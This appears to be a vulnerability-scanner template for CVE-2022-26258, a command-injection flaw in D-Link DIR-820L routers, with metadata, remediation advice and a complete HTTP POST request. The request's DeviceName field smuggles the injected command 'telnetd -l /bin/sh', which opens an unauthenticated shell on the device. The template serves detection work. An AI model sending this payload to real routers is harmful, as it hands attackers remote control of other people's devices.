id: CVE-2022-26258

info:
  name: D-Link DIR-820L Command Execution Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: D-Link DIR-820L 1.05B03 was discovered to contain remote command execution (RCE) vulnerability via HTTP POST to get set ccp.
  impact: |
    Successful exploitation could lead to remote code execution.
  remediation: |
    Apply the latest firmware patch provided by D-Link to mitigate the vulnerability.
  reference:
    - http://dir-820l.com
    - http://dlink.com
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/Mr-xn/Penetration_Testing_POC
    - https://github.com/Ostorlab/KEV
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-26258
    cwe-id: CWE-78
    epss-score: 0.66727
    epss-percentile: 0.98048
    cpe: cpe:2.3:o:dlink:dir-820l_firmware:1.05:b03:*:*:*:*:*:*
  metadata:
    vendor: dlink
    product: dir-820l_firmware
  tags: kev

http:
  - method: POST
    path:
      - "/get_set.ccp"

    headers:
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0
      Accept: application/xml, text/xml, */*; q=0.01
      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
      Accept-Encoding: gzip, deflate
      Content-Type: application/x-www-form-urlencoded
      X-Requested-With: XMLHttpRequest
      Origin: http://192.168.0.1
      Connection: close
      Referer: http://192.168.0.1/lan.asp
      Cookie: hasLogin=1

    body: |
      ccp_act=set&old_ip=192.168.0.1&old_mask=255.255.255.0&new_ip=192.168.0.1&new_mask=255.255.255.0&nextPage=lan.asp&lanHostCfg_IPAddress_1.1.1.0=192.168.0.1&lanHostCfg_SubnetMask_1.1.1.0=255.255.255.0&lanHostCfg_DomainName_1.1.1.0=&lanHostCfg_DNSRelay_1.1.1.0=1&lanHostCfg_DHCPServerEnable_1.1.1.0=1&lanHostCfg_MinAddress_1.1.1.0=192.168.0.100&lanHostCfg_MaxAddress_1.1.1.0=192.168.0.200&lanHostCfg_DHCPLeaseTime_1.1.1.0=1440&lanHostCfg_DeviceName_1.1.1.0=%0atelnetd -l /bin/sh%0a&lanHostCfg_AlwaysBroadcast_1.1.1.0=0&lanHostCfg_NetBIOSAnnouncement_1.1.1.0=0&lanHostCfg_NetBIOSLearn_1.1.1.0=0&lanHostCfg_NetBIOSScope_1.1.1.0=&lanHostCfg_NetBIOSNodeType_1.1.1.0=2&lanHostCfg_PrimaryWINSAddress_1.1.1.0=0.0.0.0&lanHostCfg_SecondaryWINSAddress_1.1.1.0=0.0.0.0&1645537536373=1645537536373
    matchers:
      - type: word
        words:
          - "telnetd: not found"
        part: body
        condition: and
